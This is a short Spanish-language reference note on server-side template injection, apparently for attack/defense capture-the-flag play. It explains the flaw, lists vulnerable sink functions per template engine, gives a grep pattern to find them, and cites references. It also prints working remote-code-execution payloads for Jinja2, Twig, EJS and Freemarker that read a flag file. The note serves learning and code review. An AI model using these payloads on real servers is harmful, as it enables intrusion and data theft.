# SSTI (Server-Side Template Injection)

## Qué es

El input del usuario se usa como **el texto de la plantilla** en vez de como un dato que la plantilla muestra. El motor evalúa las expresiones que contiene: `{{7*7}}` devuelve `49`, y desde ahí se llega a ejecutar código en el servidor.

```
Jinja2:     {{ cycler.__init__.__globals__.os.popen('cat /flag').read() }}
Twig:       {{ ['cat /flag']|filter('system') }}
EJS:        <%= process.mainModule.require('child_process').execSync('cat /flag') %>
Freemarker: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag")}
Go:         {{ .Method "arg" }} (llama métodos exportados del objeto que recibe la plantilla)
```

## Cómo identificarla en código

| Motor | Sink peligroso |
|---|---|
| Jinja2 / Flask | `render_template_string(user)`, `Template(user).render()`, `env.from_string(user)` |
| Mako | `Template(user).render()` |
| EJS / Pug / Nunjucks / Handlebars | `ejs.render(user)`, `pug.compile(user)`, `nunjucks.renderString(user)`, `Handlebars.compile(user)` |
| Twig / Smarty | `$twig->createTemplate($user)`, `$smarty->fetch('string:' . $user)` |
| Freemarker / Velocity / Thymeleaf | `new Template(..., new StringReader(user))`, `Velocity.evaluate(..., user)`, vistas con `__${...}__` |
| Go | `template.New("x").Parse(user)` |

```bash
rg -n 'render_template_string|from_string|Template\(|renderString|ejs\.render|pug\.compile|Handlebars\.compile|createTemplate|Velocity\.evaluate|\.Parse\('
```

Ojo con el patrón de "personalizar el saludo": `render_template_string("Hola " + name)`.

## Impacto en A/D

- **RCE** en Jinja2, Twig, EJS, Pug, Freemarker, Velocity.
- **flag-leak** en motores más restringidos (Go, Handlebars): acceso a `config`, variables de entorno, objetos del contexto.

## Referencias

- [PortSwigger: Server-side template injection](https://portswigger.net/web-security/server-side-template-injection)
- [PayloadsAllTheThings: SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [CWE-1336](https://cwe.mitre.org/data/definitions/1336.html)
